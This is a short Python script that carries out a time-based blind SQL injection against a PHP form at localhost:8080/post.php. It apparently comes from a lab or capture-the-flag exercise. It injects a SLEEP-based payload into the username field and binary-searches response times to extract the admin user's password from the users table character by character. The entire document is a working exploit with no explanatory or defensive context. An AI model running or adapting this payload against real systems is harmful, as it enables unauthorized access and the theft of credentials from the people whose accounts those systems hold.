import requests

TIME = 2

def is_success(r):
  return r.elapsed.total_seconds() > TIME

print("scanning...")

msg = ""
idx = 1
while True:
  head = 0x00
  tail = 0x7f
  while tail - head > 0:
    mid = (head + tail) // 2

    payload = {
      'username': f"', (SELECT IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), {idx}, 1)) <= '{mid}', sleep({TIME}), 0)))-- ",
      'message':  ''
    }
    r = requests.post('http://localhost:8080/post.php', data=payload)

    if is_success(r):
      tail = mid
    else:
      head = mid + 1

  c = chr(tail)
  print(c, end='', flush=True)

  if (c == '\0'):
    break

  msg += c
  idx += 1

print('\n')
print(f"message: {msg}")